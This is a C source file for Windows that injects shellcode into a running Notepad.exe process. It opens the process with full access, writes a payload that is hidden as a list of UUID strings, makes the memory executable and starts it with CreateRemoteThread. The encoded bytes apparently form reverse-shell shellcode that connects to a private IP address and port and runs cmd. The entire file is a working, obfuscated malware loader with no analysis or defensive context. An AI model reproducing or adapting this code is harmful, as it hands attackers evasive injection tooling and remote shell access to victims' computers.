#include <Windows.h>
#include <tlhelp32.h>
#include "misc.h"
#include "payload-obfuscation-uuid-lib.h"

#define PROCNAME L"Notepad.exe"


int main()
{
	WCHAR psPayloadUUID[] = L"e48348fc-e8f0-00c0-0000-415141505251,d2314856-4865-528b-6048-8b5218488b52,728b4820-4850-b70f-4a4a-4d31c94831c0,7c613cac-2c02-4120-c1c9-0d4101c1e2ed,48514152-528b-8b20-423c-4801d08b8088,48000000-c085-6774-4801-d0508b481844,4920408b-d001-56e3-48ff-c9418b348848,314dd601-48c9-c031-ac41-c1c90d4101c1,f175e038-034c-244c-0845-39d175d85844,4924408b-d001-4166-8b0c-48448b401c49,8b41d001-8804-0148-d041-5841585e595a,59415841-5a41-8348-ec20-4152ffe05841,8b485a59-e912-ff57-ffff-5d49be777332,0032335f-4100-4956-89e6-4881eca00100,e5894900-bc49-0002-22b8-c0a801d64154,4ce48949-f189-ba41-4c77-2607ffd54c89,010168ea-0000-4159-ba29-806b00ffd550,c9314d50-314d-48c0-ffc0-4889c248ffc0,41c18948-eaba-df0f-e0ff-d54889c76a10,894c5841-48e2-f989-41ba-99a57461ffd5,40c48148-0002-4900-b863-6d6400000000,41504100-4850-e289-5757-574d31c06a0d,e2504159-66fc-44c7-2454-0101488d4424,6800c618-8948-56e6-5041-504150415049,5041c0ff-ff49-4dc8-89c1-4c89c141ba79,ff863fcc-48d5-d231-48ff-ca8b0e41ba08,ff601d87-bbd5-b5f0-a256-41baa695bd9d,8348d5ff-28c4-063c-7c0a-80fbe07505bb,6f721347-006a-4159-89da-ffd5cabcccdc,";

	PVOID pbPayload = NULL;
	SIZE_T ulPayload = 464;     // bin payload + padding 

	HANDLE hSnapShot = NULL;
	PROCESSENTRY32 pe32 = { 0 };

	BOOL bRet = FALSE;

	DWORD dwProcessId = 0;
	HANDLE hProcess = NULL;

	HANDLE hThread = NULL;


	do
	{
		wprintf(L"[i] Collecting processes info... ");
		hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
		if (hSnapShot == INVALID_HANDLE_VALUE)
		{
			printError(L"CreateToolhelp32Snapshot");
			break;
		}
		wprintf(L"done\n");

		wprintf(L"[i] Looking for process \"%s\" PID... ", PROCNAME);
		pe32.dwSize = sizeof(PROCESSENTRY32);

		bRet = Process32First(hSnapShot, &pe32);
		if (!bRet)
		{
			printError(L"Process32First");
			break;
		}

		do
		{
			if (wcscmp(pe32.szExeFile, PROCNAME) == 0)
			{
				dwProcessId = pe32.th32ProcessID;
				break;
			}

			bRet = Process32Next(hSnapShot, &pe32);
		} while (bRet);

		if (dwProcessId == 0)
		{
			wprintf(L"not found\n");
			break;
		}
		wprintf(L"%d\n", dwProcessId);

		wprintf(L"[i] Opening process handle... ");
		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
		if (hProcess == NULL)
		{
			printError(L"OpenProcess");
			break;
		}
		wprintf(L"done\n");

		wprintf(L"[i] Allocating external memory for payload... ");
		pbPayload = VirtualAllocEx(hProcess, NULL, ulPayload, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (pbPayload == NULL)
		{
			printError(L"VirtualAllocEx");
			break;
		}
		wprintf(L"0x%p\n", pbPayload);

		wprintf(L"[i] Decoding payload... ");
		bRet = UUIDsToPayloadEx(hProcess, psPayloadUUID, (PBYTE)pbPayload, ulPayload);
		if (!bRet)
		{
			break;
		}
		wprintf(L"done\n");

		wprintf(L"[i] Adding EXECUTE flag for allocated memory... ");
		DWORD dwOldProtection = NULL;

		bRet = VirtualProtectEx(hProcess, pbPayload, ulPayload, PAGE_EXECUTE_READWRITE, &dwOldProtection);
		if (!bRet)
		{
			printError(L"VirtualProtect");
			break;
		}
		wprintf(L"done\n");

		wprintf(L"[i] Executing payload... ");
		hThread = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)pbPayload, NULL, NULL, NULL);
		if (hThread == NULL)
		{
			printError(L"CreateRemoteThread");
			break;
		}
		wprintf(L"done\n");

		WaitForSingleObject(hThread, 2000);

		wprintf(L"\t[i] Releasing external memory for payload... ");
		bRet = VirtualFreeEx(hProcess, pbPayload, 0, MEM_RELEASE);
		if (!bRet)
		{
			printError(L"VirtualFreeEx");
			break;
		}
		wprintf(L"done\n");

	} while (FALSE);

	return 0;
}